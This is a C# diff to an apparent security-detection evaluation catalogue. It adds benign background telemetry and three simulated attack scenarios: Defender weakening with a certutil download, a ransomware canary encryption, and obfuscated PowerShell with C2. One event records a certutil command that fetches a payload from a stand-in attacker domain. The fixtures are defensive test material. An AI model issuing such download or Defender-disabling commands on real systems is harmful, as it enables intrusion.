@@ -237,12 +237,109 @@ public static class ScenarioCatalog
             new Dictionary<string, string> { [AttributeKeys.WindowsEventId] = "4634" },
             timestamp: new DateTimeOffset(day.Year, day.Month, day.Day, 17, 30, 0, TimeSpan.Zero)));
 
+        // 7. Activité bénigne étendue sur 24 h (nuit 00h00–08h00 + soirée 18h00–23h55) :
+        //    mises à jour Windows/Defender signées, synchronisation OneDrive, tâches d'indexation,
+        //    résolutions DNS légitimes et blocs PowerShell d'administration bénins (sans obfuscation)
+        //    → porte le corpus témoin à ~480+ événements couvrant une journée complète de 24 h.
+        var dayStart = new DateTimeOffset(day.Year, day.Month, day.Day, 0, 5, 0, TimeSpan.Zero);
+        (string Name, string Path, string Publisher)[] backgroundSigned =
+        [
+            ("MsMpEng.exe", @"C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe", "Microsoft Windows"),
+            ("SearchIndexer.exe", @"C:\Windows\System32\SearchIndexer.exe", "Microsoft Windows"),
+            ("OneDrive.exe", @"C:\Program Files\Microsoft OneDrive\OneDrive.exe", "Microsoft Corporation"),
+            ("UsoClient.exe", @"C:\Windows\System32\UsoClient.exe", "Microsoft Windows"),
+            ("svchost.exe", @"C:\Windows\System32\svchost.exe", "Microsoft Windows"),
+            ("dotnet.exe", @"C:\Program Files\dotnet\dotnet.exe", "Microsoft Corporation")
+        ];
+        (string Domain, string Ip)[] maintenanceSites =
+        [
+            ("windowsupdate.com", "20.190.159.4"),
+            ("microsoft.com", "20.112.250.133"),
+            ("github.com", "140.82.121.4"),
+            ("office.com", "52.96.165.130")
+        ];
+
+        for (var h = 0; h < 24; h++)
+        {
+            for (var slot = 0; slot < 4; slot++)
+            {
+                var ts = dayStart.AddHours(h).AddMinutes(slot * 14);
+                var bg = backgroundSigned[(h * 4 + slot) % backgroundSigned.Length];
+                var site = maintenanceSites[(h + slot) % maintenanceSites.Length];
+
+                events.Add(SecurityEvent.Create(
+                    hostId, "SYSTEM", EventCategory.Process, EventTypes.ProcessStart, bg.Path,
+                    new Dictionary<string, string>
+                    {
+                        [AttributeKeys.ProcessId] = (3200 + h * 10 + slot).ToString(CultureInfo.InvariantCulture),
+                        [AttributeKeys.ProcessName] = bg.Name,
+                        [AttributeKeys.ProcessPath] = bg.Path,
+                        [AttributeKeys.ParentProcessName] = "services.exe",
+                        [AttributeKeys.Signed] = "true",
+                        [AttributeKeys.Publisher] = bg.Publisher,
+                        [AttributeKeys.Elevated] = "false"
+                    },
+                    timestamp: ts));
+
+                events.Add(SecurityEvent.Create(
+                    hostId, "SYSTEM", EventCategory.Network, EventTypes.NetworkConnection, site.Domain,
+                    new Dictionary<string, string>
+                    {
+                        [AttributeKeys.Domain] = site.Domain,
+                        [AttributeKeys.RemoteIp] = site.Ip,
+                        [AttributeKeys.RemotePort] = "443",
+                        [AttributeKeys.Protocol] = "tcp",
+                        [AttributeKeys.Direction] = "outbound",
+                        [AttributeKeys.IsPrivateIp] = "false",
+                        [AttributeKeys.BytesSent] = (4_200 + slot * 1_800).ToString(CultureInfo.InvariantCulture),
+                        [AttributeKeys.BytesReceived] = (92_000 + slot * 12_000).ToString(CultureInfo.InvariantCulture),
+                        [AttributeKeys.DomainAgeDays] = "9500",
+                        [AttributeKeys.ProcessName] = bg.Name
+                    },
+                    timestamp: ts.AddSeconds(3)));
+            }
+
+            // Bloc de script PowerShell bénin (ex. vérification de profil ou Get-Service sans aucun indicateur suspect)
+            events.Add(SecurityEvent.Create(
+                hostId, userId, EventCategory.Script, EventTypes.PowerShellScriptBlock, $"ps-profile-check-{h:D2}",
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.WindowsEventId] = "4104",
+                    [AttributeKeys.ScriptBlockId] = $"ps-profile-check-{h:D2}",
+                    [AttributeKeys.ScriptLength] = "142",
+                    [AttributeKeys.Entropy] = "4.10",
+                    [AttributeKeys.ScriptObfuscationScore] = "5",
+                    [AttributeKeys.ScriptIndicators] = string.Empty,
+                    [AttributeKeys.ScriptHash] = $"benign-ps-hash-{h:D2}00000000000000000000000000000000000000000000000000"
+                },
+                timestamp: dayStart.AddHours(h).AddMinutes(25)));
+
+            // Mise à jour de journal ou cache bureautique bénin basse entropie
+            var docPath = $@"C:\Users\{userId}\Documents\journal_activite_{h:D2}.txt";
+            events.Add(SecurityEvent.Create(
+                hostId, userId, EventCategory.File, EventTypes.FileModified, docPath,
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.FilePath] = docPath,
+                    [AttributeKeys.FileName] = $"journal_activite_{h:D2}.txt",
+                    [AttributeKeys.Extension] = ".txt",
+                    [AttributeKeys.FileSize] = "6400",
+                    [AttributeKeys.Entropy] = "3.95",
+                    [AttributeKeys.DoubleExtension] = "false",
+                    [AttributeKeys.IsExecutable] = "false",
+                    [AttributeKeys.IsArchive] = "false",
+                    [AttributeKeys.WatchedFolder] = WatchedFolders.Documents
+                },
+                timestamp: dayStart.AddHours(h).AddMinutes(40)));
+        }
+
         events.Sort((a, b) => a.Timestamp.CompareTo(b.Timestamp));
         return events;
     }
 
     /// <summary>
-    /// Retourne les 8 scénarios d'attaque réalistes complets (doc §8.3, §14.1, §14.4).
+    /// Retourne les 11 scénarios d'attaque réalistes complets (8 scénarios v1 + 3 scénarios v2 :
+    /// Affaiblissement Defender + LOLBin, Piège Canari anti-ransomware, Script PowerShell 4104 obfusqué).
     /// </summary>
     public static IReadOnlyList<AttackScenario> BuildAttackScenarios(
         string hostId = DefaultEvalHostId,
@@ -260,7 +357,10 @@ public static class ScenarioCatalog
             BuildScenario5BruteForce(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 3, 14, 10, TimeSpan.Zero)),
             BuildScenario6Persistence(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 15, 10, 0, TimeSpan.Zero)),
             BuildScenario7SocialEngineering(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 16, 0, 0, TimeSpan.Zero)),
-            BuildScenario8Eicar(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 16, 30, 0, TimeSpan.Zero))
+            BuildScenario8Eicar(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 16, 30, 0, TimeSpan.Zero)),
+            BuildScenario9DefenderWeakening(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 16, 50, 0, TimeSpan.Zero)),
+            BuildScenario10CanaryTrap(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 17, 5, 0, TimeSpan.Zero)),
+            BuildScenario11ScriptObfuscation(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 17, 20, 0, TimeSpan.Zero))
         ];
     }
 
@@ -910,6 +1010,228 @@ public static class ScenarioCatalog
             ThreatType.Malware,
             ExpectedChainId: null,
             IsMultiStageChain: false,
+            events);
+    }
+
+    /// <summary>
+    /// Scénario 9 (v2) — Affaiblissement Microsoft Defender + LOLBin (T1562.001, T1218) :
+    /// dépôt d'un script dans Temp → ajout d'une exclusion Defender → désactivation temps réel → téléchargement via certutil (Sigma).
+    /// </summary>
+    public static AttackScenario BuildScenario9DefenderWeakening(string hostId, string userId, DateTimeOffset t0)
+    {
+        var tempScript = $@"C:\Users\{userId}\AppData\Local\Temp\maint_sync.ps1";
+        var exclPath = $@"C:\Users\{userId}\AppData\Local\Temp";
+
+        var events = new List<SecurityEvent>
+        {
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.File, EventTypes.FileCreated, tempScript,
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.FilePath] = tempScript,
+                    [AttributeKeys.FileName] = "maint_sync.ps1",
+                    [AttributeKeys.Extension] = ".ps1",
+                    [AttributeKeys.FileSize] = "2480",
+                    [AttributeKeys.IsExecutable] = "true",
+                    [AttributeKeys.WatchedFolder] = WatchedFolders.Temp
+                },
+                correlationHints: $"file:{tempScript}",
+                timestamp: t0),
+
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Defender, EventTypes.DefenderExclusionAdded, exclPath,
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.WindowsEventId] = "5007",
+                    [AttributeKeys.DefenderExclusion] = exclPath,
+                    [AttributeKeys.CollectorSource] = "Microsoft-Windows-Windows Defender/Operational"
+                },
+                correlationHints: $"file:{tempScript}",
+                timestamp: t0.AddSeconds(12)),
+
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Defender, EventTypes.DefenderRealtimeDisabled, "WinDefend",
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.WindowsEventId] = "5001",
+                    [AttributeKeys.CollectorSource] = "Microsoft-Windows-Windows Defender/Operational"
+                },
+                correlationHints: $"file:{tempScript}",
+                timestamp: t0.AddSeconds(24)),
+
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, @"C:\Windows\System32\certutil.exe",
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.ProcessId] = "9120",
+                    [AttributeKeys.ProcessName] = "certutil.exe",
+                    [AttributeKeys.ProcessPath] = @"C:\Windows\System32\certutil.exe",
+                    [AttributeKeys.ParentProcessName] = "cmd.exe",
+                    [AttributeKeys.CommandLine] = $@"certutil.exe -urlcache -split -f https://cdn-update-sync.xyz/stage1.bin {exclPath}\stage1.bin",
+                    [AttributeKeys.Signed] = "true"
+                },
+                correlationHints: $"file:{tempScript}",
+                timestamp: t0.AddSeconds(36))
+        };
+
+        return new AttackScenario(
+            "S9",
+            "9. Affaiblissement Defender (v2)",
+            "Script Temp → ajout exclusion Microsoft Defender → arrêt protection temps réel → LOLBin certutil (règle Sigma).",
+            ["T1562.001", "T1218", "T1105"],
+            ThreatType.Tampering,
+            ExpectedChainId: "CHAIN-DEFENDER-EVASION",
+            IsMultiStageChain: true,
+            events);
+    }
+
+    /// <summary>
+    /// Scénario 10 (v2) — Piège Canari anti-ransomware (T1486) :
+    /// lancement d'un binaire non signé depuis Temp → altération + chiffrement d'un fichier leurre canari.
+    /// </summary>
+    public static AttackScenario BuildScenario10CanaryTrap(string hostId, string userId, DateTimeOffset t0)
+    {
+        var procPath = $@"C:\Users\{userId}\AppData\Local\Temp\doc_sync_helper.exe";
+        var canaryPath = $@"C:\Users\{userId}\Documents\00_Plan_Budget_2026.docx";
+
+        var events = new List<SecurityEvent>
+        {
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, procPath,
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.ProcessId] = "9210",
+                    [AttributeKeys.ProcessName] = "doc_sync_helper.exe",
+                    [AttributeKeys.ProcessPath] = procPath,
+                    [AttributeKeys.ParentProcessName] = "explorer.exe",
+                    [AttributeKeys.Signed] = "false",
+                    [AttributeKeys.WatchedFolder] = WatchedFolders.Temp
+                },
+                correlationHints: $"file:{canaryPath}",
+                timestamp: t0),
+
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Canary, EventTypes.CanaryModified, canaryPath,
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.CanaryId] = "cn-budget-01",
+                    [AttributeKeys.FilePath] = canaryPath,
+                    [AttributeKeys.Entropy] = "7.88",
+                    [AttributeKeys.Reason] = "Modification et hausse d'entropie détectées sur fichier canari anti-ransomware"
+                },
+                correlationHints: $"file:{canaryPath}",
+                timestamp: t0.AddSeconds(4)),
+
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Canary, EventTypes.CanaryEncrypted, canaryPath + ".locked",
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.CanaryId] = "cn-budget-01",
+                    [AttributeKeys.FilePath] = canaryPath + ".locked",
+                    [AttributeKeys.OldFilePath] = canaryPath,
+                    [AttributeKeys.Entropy] = "7.94",
+                    [AttributeKeys.Reason] = "Chiffrement et renommage .locked d'un fichier canari anti-ransomware"
+                },
+                correlationHints: $"file:{canaryPath}",
+                timestamp: t0.AddSeconds(7))
+        };
+
+        return new AttackScenario(
+            "S10",
+            "10. Piège Canari Ransomware (v2)",
+            "Processus non signé depuis Temp → modification et chiffrement haute entropie d'un fichier leurre canari.",
+            ["T1486"],
+            ThreatType.Ransomware,
+            ExpectedChainId: "CHAIN-RANSOMWARE",
+            IsMultiStageChain: true,
+            events);
+    }
+
+    /// <summary>
+    /// Scénario 11 (v2) — Visibilité script PowerShell 4104 obfusqué (T1059.001, T1027, T1562.006) :
+    /// bloc obfusqué (signal modéré) → bloc encodé + téléchargement (escalade corrélée au 2ᵉ événement) → tentative bypass journalisation → C2.
+    /// </summary>
+    public static AttackScenario BuildScenario11ScriptObfuscation(string hostId, string userId, DateTimeOffset t0)
+    {
+        const string scriptBlockId = "sb-99401";
+        const string pid = "9450";
+
+        var events = new List<SecurityEvent>
+        {
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Script, EventTypes.PowerShellScriptBlock, scriptBlockId,
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.WindowsEventId] = "4104",
+                    [AttributeKeys.ProcessId] = pid,
+                    [AttributeKeys.ScriptBlockId] = scriptBlockId,
+                    [AttributeKeys.ScriptLength] = "1420",
+                    [AttributeKeys.Entropy] = "6.45",
+                    [AttributeKeys.ScriptObfuscationScore] = "78",
+                    [AttributeKeys.ScriptIndicators] = "HighObfuscation",
+                    [AttributeKeys.ScriptHash] = "1111111111111111111111111111111111111111111111111111111111114104"
+                },
+                correlationHints: $"pid:{pid}",
+                timestamp: t0),
+
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Script, EventTypes.PowerShellScriptBlock, scriptBlockId + "-2",
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.WindowsEventId] = "4104",
+                    [AttributeKeys.ProcessId] = pid,
+                    [AttributeKeys.ScriptBlockId] = scriptBlockId + "-2",
+                    [AttributeKeys.ScriptLength] = "2180",
+                    [AttributeKeys.Entropy] = "6.72",
+                    [AttributeKeys.ScriptObfuscationScore] = "84",
+                    [AttributeKeys.ScriptIndicators] = "EncodedCommand",
+                    [AttributeKeys.ScriptHash] = "2222222222222222222222222222222222222222222222222222222222224104"
+                },
+                correlationHints: $"pid:{pid}",
+                timestamp: t0.AddSeconds(9)),
+
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Script, EventTypes.ScriptLoggingBypass, scriptBlockId + "-3",
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.WindowsEventId] = "4104",
+                    [AttributeKeys.ProcessId] = pid,
+                    [AttributeKeys.ScriptBlockId] = scriptBlockId + "-3",
+                    [AttributeKeys.ScriptLength] = "980",
+                    [AttributeKeys.Entropy] = "5.80",
+                    [AttributeKeys.ScriptObfuscationScore] = "88",
+                    [AttributeKeys.ScriptIndicators] = "LoggingOrDefenseBypass,DownloadAndExecute",
+                    [AttributeKeys.ScriptHash] = "3333333333333333333333333333333333333333333333333333333333334104"
+                },
+                correlationHints: $"pid:{pid}",
+                timestamp: t0.AddSeconds(18)),
+
+            SecurityEvent.Create(
+                hostId, userId, EventCategory.Network, EventTypes.NetworkConnection, "198.51.100.77:8443",
+                new Dictionary<string, string>
+                {
+                    [AttributeKeys.ProcessId] = pid,
+                    [AttributeKeys.ProcessName] = "powershell.exe",
+                    [AttributeKeys.RemoteIp] = "198.51.100.77",
+                    [AttributeKeys.RemotePort] = "8443",
+                    [AttributeKeys.Protocol] = "tcp",
+                    [AttributeKeys.Direction] = "outbound",
+                    [AttributeKeys.IsPrivateIp] = "false",
+                    [AttributeKeys.BytesSent] = "8400",
+                    [AttributeKeys.BytesReceived] = "32000"
+                },
+                correlationHints: $"pid:{pid},ip:198.51.100.77",
+                timestamp: t0.AddSeconds(24))
+        };
+
+        return new AttackScenario(
+            "S11",
+            "11. Script PowerShell 4104 (v2)",
+            "Séquence PowerShell Script Block Logging 4104 : obfuscation → encodage → tentative bypass journalisation → C2.",
+            ["T1059.001", "T1027", "T1562.006", "T1071"],
+            ThreatType.Malware,
+            ExpectedChainId: "CHAIN-SCRIPT-OBFUSCATION",
+            IsMultiStageChain: true,
             events);
     }
 
